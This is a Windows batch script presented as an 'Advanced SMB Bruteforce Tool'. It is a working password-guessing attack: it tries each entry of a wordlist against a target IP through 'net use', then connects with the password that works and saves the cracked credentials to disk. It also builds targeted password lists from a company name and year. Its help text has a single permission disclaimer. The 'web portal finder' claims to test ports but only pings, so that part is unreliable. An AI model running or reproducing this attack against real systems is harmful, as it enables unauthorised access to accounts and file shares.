@echo off
setlocal EnableDelayedExpansion
title Advanced SMB Bruteforce Tool v2.0
color 0A

:: Color definitions
set "GREEN=0A"
set "RED=0C"
set "YELLOW=0E"
set "BLUE=09"
set "CYAN=0B"
set "WHITE=0F"
set "PURPLE=0D"

:: Menu tracker
set "CURRENT_MENU=main"

:: Initialize default settings
set "DEFAULT_RETRIES=3"
set "DEFAULT_TIMEOUT=2"
set "DEFAULT_THREADS=1"
set "LOG_ENABLED=yes"
set "VERBOSE_MODE=no"
set "SAVE_RESULTS=yes"
set "USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
set "RESULTS_DIR=%USERPROFILE%\Documents\SMB_Results"

:: Create results directory if it doesn't exist
if not exist "%RESULTS_DIR%" mkdir "%RESULTS_DIR%"

:: Date and time for filenames
for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
set "TIMESTAMP=%dt:~0,8%-%dt:~8,6%"
set "LOG_FILE=%RESULTS_DIR%\smb_bruteforce_%TIMESTAMP%.log"

:: Display main menu
:main_menu
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #          ADVANCED SMB BRUTEFORCE TOOL v2.0           #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Start Bruteforce Attack
echo  [2] Advanced Options
echo  [3] Tools
echo  [4] Help
echo  [5] Exit
echo.
set /p "choice=Select option [1-5]: "

if "%choice%"=="1" goto start_attack
if "%choice%"=="2" goto advanced_options
if "%choice%"=="3" goto tools_menu
if "%choice%"=="4" goto help_menu
if "%choice%"=="5" exit
goto main_menu

:: Advanced options menu
:advanced_options
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #               ADVANCED OPTIONS                        #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Connection Settings
echo  [2] Attack Options
echo  [3] Logging Options
echo  [4] Web Integration
echo  [5] Back to Main Menu
echo.
set /p "choice=Select option [1-5]: "

if "%choice%"=="1" goto connection_settings
if "%choice%"=="2" goto attack_options
if "%choice%"=="3" goto logging_options
if "%choice%"=="4" goto web_integration
if "%choice%"=="5" goto main_menu
goto advanced_options

:: Connection settings
:connection_settings
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #               CONNECTION SETTINGS                     #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  Current settings:
echo  [1] Retry attempts per password: %DEFAULT_RETRIES%
echo  [2] Timeout between attempts (seconds): %DEFAULT_TIMEOUT%
echo  [3] Threads (simulated): %DEFAULT_THREADS%
echo  [4] Back to Advanced Options
echo.
set /p "choice=Select option to modify [1-4]: "

if "%choice%"=="1" (
    set /p "DEFAULT_RETRIES=Enter new retry value: "
    goto connection_settings
)
if "%choice%"=="2" (
    set /p "DEFAULT_TIMEOUT=Enter new timeout value (seconds): "
    goto connection_settings
)
if "%choice%"=="3" (
    set /p "DEFAULT_THREADS=Enter new thread count (1-5): "
    if !DEFAULT_THREADS! LSS 1 set "DEFAULT_THREADS=1"
    if !DEFAULT_THREADS! GTR 5 set "DEFAULT_THREADS=5"
    goto connection_settings
)
if "%choice%"=="4" goto advanced_options
goto connection_settings

:: Attack options
:attack_options
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                  ATTACK OPTIONS                       #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Toggle verbose mode: %VERBOSE_MODE%
echo  [2] Toggle save results: %SAVE_RESULTS%
echo  [3] Custom wordlist generator
echo  [4] Back to Advanced Options
echo.
set /p "choice=Select option [1-4]: "

if "%choice%"=="1" (
    if "%VERBOSE_MODE%"=="yes" (
        set "VERBOSE_MODE=no"
    ) else (
        set "VERBOSE_MODE=yes"
    )
    goto attack_options
)
if "%choice%"=="2" (
    if "%SAVE_RESULTS%"=="yes" (
        set "SAVE_RESULTS=no"
    ) else (
        set "SAVE_RESULTS=yes"
    )
    goto attack_options
)
if "%choice%"=="3" goto wordlist_generator
if "%choice%"=="4" goto advanced_options
goto attack_options

:: Logging options
:logging_options
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                 LOGGING OPTIONS                       #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Toggle logging: %LOG_ENABLED%
echo  [2] View logs directory
echo  [3] Clear logs
echo  [4] Back to Advanced Options
echo.
set /p "choice=Select option [1-4]: "

if "%choice%"=="1" (
    if "%LOG_ENABLED%"=="yes" (
        set "LOG_ENABLED=no"
    ) else (
        set "LOG_ENABLED=yes"
    )
    goto logging_options
)
if "%choice%"=="2" (
    start explorer "%RESULTS_DIR%"
    goto logging_options
)
if "%choice%"=="3" (
    del /q "%RESULTS_DIR%\*.log" 2>nul
    echo  [+] Logs cleared successfully!
    timeout /t 2 >nul
    goto logging_options
)
if "%choice%"=="4" goto advanced_options
goto logging_options

:: Web integration
:web_integration
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                 WEB INTEGRATION                       #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Set User-Agent: %USER_AGENT%
echo  [2] Test web connectivity
echo  [3] Web portal finder
echo  [4] Back to Advanced Options
echo.
set /p "choice=Select option [1-4]: "

if "%choice%"=="1" (
    set /p "USER_AGENT=Enter new User-Agent string: "
    goto web_integration
)
if "%choice%"=="2" goto test_connectivity
if "%choice%"=="3" goto web_portal_finder
if "%choice%"=="4" goto advanced_options
goto web_integration

:: Test connectivity
:test_connectivity
cls
echo.
echo  [*] Testing internet connectivity...
ping -n 1 google.com >nul 2>&1
if errorlevel 1 (
    color %RED%
    echo  [!] No internet connection detected!
) else (
    color %GREEN%
    echo  [+] Internet connection working properly.
)
echo.
echo  [*] Press any key to return...
pause >nul
color %GREEN%
goto web_integration

:: Web portal finder
:web_portal_finder
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                 WEB PORTAL FINDER                     #
echo  #                                                       #
echo  #=======================================================#
echo.
set /p "target_ip=Enter target IP: "

echo  [*] Scanning common web portals on %target_ip%...
echo  [*] This could take a moment...
echo.

:: Simulate scanning common web ports
echo  [*] Testing port 80 (HTTP)...
ping -n 1 -w 500 %target_ip% >nul 2>&1
if errorlevel 1 (
    echo  [-] Port 80: Closed or filtered
) else (
    echo  [+] Port 80: Potentially open (HTTP)
)

echo  [*] Testing port 443 (HTTPS)...
ping -n 1 -w 500 %target_ip% >nul 2>&1
if errorlevel 1 (
    echo  [-] Port 443: Closed or filtered
) else (
    echo  [+] Port 443: Potentially open (HTTPS)
)

echo  [*] Testing port 8080 (Alt HTTP)...
ping -n 1 -w 500 %target_ip% >nul 2>&1
if errorlevel 1 (
    echo  [-] Port 8080: Closed or filtered
) else (
    echo  [+] Port 8080: Potentially open (Alt HTTP)
)

echo.
echo  [*] Scan complete. Press any key to return...
pause >nul
goto web_integration

:: Tools menu
:tools_menu
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                      TOOLS                            #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Network Diagnostic
echo  [2] Password List Manager
echo  [3] Session Manager
echo  [4] System Information
echo  [5] Back to Main Menu
echo.
set /p "choice=Select option [1-5]: "

if "%choice%"=="1" goto network_diagnostic
if "%choice%"=="2" goto password_manager
if "%choice%"=="3" goto session_manager
if "%choice%"=="4" goto system_info
if "%choice%"=="5" goto main_menu
goto tools_menu

:: Network diagnostic
:network_diagnostic
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                NETWORK DIAGNOSTIC                     #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [*] Running network diagnostics...
echo.
echo  [*] Local IP information:
ipconfig | findstr /i "IPv4"
echo.
echo  [*] Connection test:
ping -n 1 8.8.8.8 | findstr /i "time"
echo.
echo  [*] SMB Port check (445):
echo  [*] Checking if SMB port is accessible...
netstat -an | findstr "445" | findstr "LISTENING"
if errorlevel 1 (
    echo  [-] Port 445 not found in listening state!
) else (
    echo  [+] Port 445 is open and listening.
)
echo.
echo  [*] Press any key to return to Tools menu...
pause >nul
goto tools_menu

:: Password list manager
:password_manager
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #               PASSWORD LIST MANAGER                   #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [1] Create basic password list
echo  [2] Count entries in password list
echo  [3] View sample of password list
echo  [4] Back to Tools menu
echo.
set /p "choice=Select option [1-4]: "

if "%choice%"=="1" goto create_wordlist
if "%choice%"=="2" goto count_wordlist
if "%choice%"=="3" goto view_wordlist
if "%choice%"=="4" goto tools_menu
goto password_manager

:: Create basic wordlist
:create_wordlist
cls
echo.
echo  [*] Creating basic password list...
set /p "output_file=Enter output file path: "
echo.
echo  [*] Adding common passwords to list...

echo admin> "%output_file%"
echo password>> "%output_file%"
echo 123456>> "%output_file%"
echo admin123>> "%output_file%"
echo root>> "%output_file%"
echo qwerty>> "%output_file%"
echo 1234>> "%output_file%"
echo 12345>> "%output_file%"
echo 123456789>> "%output_file%"
echo test>> "%output_file%"
echo guest>> "%output_file%"
echo welcome>> "%output_file%"

echo  [+] Created basic password list with 12 entries.
echo  [+] Saved to: %output_file%
echo.
echo  [*] Press any key to return...
pause >nul
goto password_manager

:: Count wordlist entries
:count_wordlist
cls
echo.
set /p "wordlist_file=Enter wordlist path: "
if not exist "%wordlist_file%" (
    echo  [!] File not found: %wordlist_file%
    timeout /t 2 >nul
    goto password_manager
)

echo  [*] Counting passwords in list...
set /a count=0
for /f %%a in (%wordlist_file%) do set /a count+=1
echo  [+] Total passwords in list: %count%
echo.
echo  [*] Press any key to return...
pause >nul
goto password_manager

:: View wordlist sample
:view_wordlist
cls
echo.
set /p "wordlist_file=Enter wordlist path: "
if not exist "%wordlist_file%" (
    echo  [!] File not found: %wordlist_file%
    timeout /t 2 >nul
    goto password_manager
)

echo  [*] Sample of passwords in list:
echo  ------------------------------------------
set /a sample=0
for /f "tokens=*" %%a in (%wordlist_file%) do (
    echo  %%a
    set /a sample+=1
    if !sample! geq 10 goto end_sample
)
:end_sample
echo  ------------------------------------------
echo.
echo  [*] Press any key to return...
pause >nul
goto password_manager

:: Session manager
:session_manager
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                 SESSION MANAGER                       #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [*] Current SMB connections:
echo  ------------------------------------------
net use | findstr /i "\\\"
echo  ------------------------------------------
echo.
echo  [1] Disconnect all SMB sessions
echo  [2] Back to Tools menu
echo.
set /p "choice=Select option [1-2]: "

if "%choice%"=="1" (
    echo  [*] Disconnecting all SMB sessions...
    net use * /delete /y >nul 2>&1
    echo  [+] All SMB sessions disconnected.
    timeout /t 2 >nul
)
if "%choice%"=="2" goto tools_menu
goto session_manager

:: System information
:system_info
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #               SYSTEM INFORMATION                      #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [*] Operating System:
wmic os get Caption, Version /value | findstr /i "caption version"
echo.
echo  [*] System Architecture:
wmic os get OSArchitecture /value | findstr /i "osarchitecture"
echo.
echo  [*] Current User:
echo  %USERNAME%@%USERDOMAIN%
echo.
echo  [*] Press any key to return to Tools menu...
pause >nul
goto tools_menu

:: Help menu
:help_menu
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                      HELP                             #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  ABOUT:
echo  Advanced SMB Bruteforce Tool is a powerful utility for
echo  testing SMB authentication on Windows networks.
echo.
echo  USAGE NOTES:
echo  1. Use this tool ONLY on systems you have permission to test
echo  2. Input a target IP address, username, and password list
echo  3. The tool will attempt to connect via SMB with each password
echo  4. Successful passwords will be logged and reported
echo.
echo  AVAILABLE COMMANDS:
echo  - Start Attack: Begin bruteforce process
echo  - Advanced Options: Configure tool settings
echo  - Tools: Access network utilities
echo  - Help: View this help information
echo  - Exit: Close the application
echo.
echo  [*] Press any key to return to Main Menu...
pause >nul
goto main_menu

:: Wordlist generator
:wordlist_generator
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #              WORDLIST GENERATOR                       #
echo  #                                                       #
echo  #=======================================================#
echo.
set /p "output_file=Enter output wordlist path: "
set /p "base_word=Enter a base word (e.g. company name): "
set /p "year=Enter a year (e.g. 2023): "
echo.
echo  [*] Generating wordlist combinations...

(
    echo %base_word%
    echo %base_word%%year%
    echo %base_word%123
    echo %base_word%@%year%
    echo %base_word%#%year%
    echo %base_word%.%year%
    echo %base_word%_%year%
    echo %base_word%!%year%
    echo %base_word%123!
    echo %base_word%admin
    echo admin%base_word%
    echo %base_word%pass
    echo %base_word%1234
    echo %base_word%4321
    echo %base_word%12345
    echo %base_word%@123
    echo %base_word%@admin
    echo Admin@%base_word%
    echo %base_word%@admin123
    echo Password@%base_word%
) > "%output_file%"

echo  [+] Generated 20 password combinations.
echo  [+] Saved to: %output_file%
echo.
echo  [*] Press any key to return...
pause >nul
goto attack_options

:: Start attack preparation
:start_attack
cls
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #               BRUTEFORCE ATTACK                       #
echo  #                                                       #
echo  #=======================================================#
echo.

:: Input validation
:get_input
echo  [*] Please provide the required information:
echo  ------------------------------------------
set /p "ip=  [+] Target IP Address: "
if "%ip%"=="" (
    color %RED%
    echo  [!] Error: IP address cannot be empty!
    timeout /t 2 >nul
    color %GREEN%
    goto get_input
)

set /p "user=  [+] Username: "
if "%user%"=="" (
    color %RED%
    echo  [!] Error: Username cannot be empty!
    timeout /t 2 >nul
    color %GREEN%
    goto get_input
)

set /p "wordlist=  [+] Password List (full path): "
if "%wordlist%"=="" (
    color %RED%
    echo  [!] Error: Password list cannot be empty!
    timeout /t 2 >nul
    color %GREEN%
    goto get_input
)

:: Verify if wordlist exists
if not exist "%wordlist%" (
    color %RED%
    echo  [!] Error: Password list not found at "%wordlist%"
    echo  [!] Please check the path and try again.
    timeout /t 3 >nul
    color %GREEN%
    goto get_input
)

:: Initialize attack variables
set "retries=%DEFAULT_RETRIES%"
set /a count=1
set /a total=0
set "found=false"

:: Count total passwords
echo.
echo  [*] Counting passwords in wordlist...
for /f "tokens=*" %%a in (%wordlist%) do set /a total+=1
echo  [+] Found %total% passwords to try

:: Confirm attack
echo.
echo  [*] Attack Configuration:
echo  ------------------------------------------
echo  [+] Target: %ip%
echo  [+] Username: %user%
echo  [+] Wordlist: %wordlist% (%total% passwords)
echo  [+] Retries per password: %retries%
echo  [+] Logging: %LOG_ENABLED%
echo  [+] Verbose mode: %VERBOSE_MODE%
echo.
set /p "confirm=  [?] Start the attack? (Y/N): "
if /i not "%confirm%"=="Y" goto main_menu

:: Create log if enabled
if "%LOG_ENABLED%"=="yes" (
    echo [%date% %time%] SMB Bruteforce Attack Started > "%LOG_FILE%"
    echo [%date% %time%] Target: %ip% >> "%LOG_FILE%"
    echo [%date% %time%] Username: %user% >> "%LOG_FILE%"
    echo [%date% %time%] Wordlist: %wordlist% >> "%LOG_FILE%"
    echo [%date% %time%] Total passwords: %total% >> "%LOG_FILE%"
)

:: Start the attack
cls
echo.
echo  [*] Starting SMB Bruteforce Attack on %ip%
echo  [*] Username: %user%
echo  [*] Press CTRL+C to abort
echo.

for /f "tokens=*" %%a in (%wordlist%) do (
    set "pass=%%a"
    call :attempt
    if "!found!"=="true" goto success
)

:: Password not found
color %RED%
echo.
echo  [!] Attack completed - Password not found after testing all %total% entries.
echo.
if "%LOG_ENABLED%"=="yes" (
    echo [%date% %time%] Attack completed - No password found >> "%LOG_FILE%"
)
goto attack_end

:: Success function
:success
cls
color %GREEN%
echo.
echo  #=======================================================#
echo  #                                                       #
echo  #                PASSWORD FOUND!                        #
echo  #                                                       #
echo  #=======================================================#
echo.
echo  [+] Password Found: %pass%
echo  [+] Username: %user%
echo  [+] Target: %ip%
echo  [+] Attempts: %count% of %total%
echo.
echo  [*] Establishing connection...
net use \\%ip% /user:%user% "%pass%" >nul 2>&1
echo  [+] Connection successfully established!

if "%LOG_ENABLED%"=="yes" (
    echo [%date% %time%] SUCCESS! Password found: %pass% >> "%LOG_FILE%"
    echo [%date% %time%] Attempts required: %count% of %total% >> "%LOG_FILE%"
)

if "%SAVE_RESULTS%"=="yes" (
    echo [+] Target: %ip% > "%RESULTS_DIR%\success_%ip%_%TIMESTAMP%.txt"
    echo [+] Username: %user% >> "%RESULTS_DIR%\success_%ip%_%TIMESTAMP%.txt"
    echo [+] Password: %pass% >> "%RESULTS_DIR%\success_%ip%_%TIMESTAMP%.txt"
    echo [+] Date/Time: %date% %time% >> "%RESULTS_DIR%\success_%ip%_%TIMESTAMP%.txt"
    echo [+] Results saved to: %RESULTS_DIR%\success_%ip%_%TIMESTAMP%.txt
)

:attack_end
echo.
echo  [1] Return to Main Menu
echo  [2] Exit
echo.
set /p "choice=Select option [1-2]: "
if "%choice%"=="1" goto main_menu
exit

:: Attempt function
:attempt
set /a attempt_count=1

:retry_connection
:: Show progress
set /a percent=count*100/total
set "progressBar="
set /a numChars=percent/5
for /l %%i in (1,1,20) do (
    if %%i leq !numChars! (
        set "progressBar=!progressBar!#"
    ) else (
        set "progressBar=!progressBar!."
    )
)

cls
echo.
echo  [*] SMB Bruteforce Attack in Progress
echo  ------------------------------------------
echo  [*] Target: %ip%
echo  [*] Username: %user%
echo  [*] Current: !count!/%total% (!percent!%%)
if "%VERBOSE_MODE%"=="yes" echo  [*] Password: !pass!
echo.
echo  [!progressBar!] !percent!%%
echo.

:: Try connection
net use \\%ip% /user:%user% "!pass!" >nul 2>&1

:: Check result
if !errorlevel! EQU 0 (
    set found=true
    exit /b
)

:: Handle retry logic
if !attempt_count! lss !retries! (
    if "%VERBOSE_MODE%"=="yes" (
        color %YELLOW%
        echo  [!] Attempt !attempt_count! failed - Retrying in %DEFAULT_TIMEOUT% seconds...
        timeout /t %DEFAULT_TIMEOUT% >nul
        color %GREEN%
    )
    set /a attempt_count+=1
    goto retry_connection
)

:: Failed password
if "%VERBOSE_MODE%"=="yes" (
    color %RED%
    echo  [-] Password failed: !pass!
    timeout /t 1 >nul
    color %GREEN%
)

if "%LOG_ENABLED%"=="yes" (
    if "%VERBOSE_MODE%"=="yes" (
        echo [%date% %time%] Failed password: !pass! >> "%LOG_FILE%"
    )
)

set /a count+=1
exit /b